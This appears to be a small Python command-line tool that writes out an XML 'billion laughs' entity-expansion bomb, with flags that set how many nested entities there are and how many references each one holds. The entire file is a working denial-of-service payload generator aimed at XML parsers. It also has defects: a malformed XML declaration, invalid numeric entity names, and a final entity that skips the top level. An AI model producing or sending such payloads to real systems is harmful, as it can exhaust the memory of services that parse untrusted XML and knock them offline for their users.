#!/usr/bin/python3
import sys
import argparse

def xmlbomb(ents, refs, name, content):
	i = 0
	j = i - 1
	sys.stdout.write('<?xml version="1.0">\n')
	sys.stdout.write('<!DOCTYPE ' + name + ' [\n')
	sys.stdout.write('  <!ENTITY 0 "' + content + '">\n')
	for _ in range(ents):
		i += 1
		j = i - 1
		sys.stdout.write('  <!ENTITY ' + str(i) + ' "')
		for _ in range(refs):
			sys.stdout.write(r'&' + str(j) + ';')
		sys.stdout.write('">\n')
	sys.stdout.write('  <!ENTITY start "&' + str(j) + ';">\n')
	sys.stdout.write(']>\n')
	sys.stdout.write('<' + name + '>&start;</' + name + '>')
	return

def main():
	parser = argparse.ArgumentParser(description="xmlbomber", epilog="Created by InkPrism (Original by https://github.com/lp0-on-fire)")
	parser.add_argument("-e", "--entity", type=int, help="amount of entities (default: 10)", default=10)
	parser.add_argument("-r", "--reference", type=int, help="amount of references (default: 10)", default=10)
	parser.add_argument("-n", "--name", help="name (default: lol)", default="lol")
	parser.add_argument("-c", "--content", help="content of first entity (default: lol)", default="lol")
	args, unknown = parser.parse_known_args()
	xmlbomb(args.entity, args.reference, args.name, args.content)

if __name__ == '__main__':
	main()
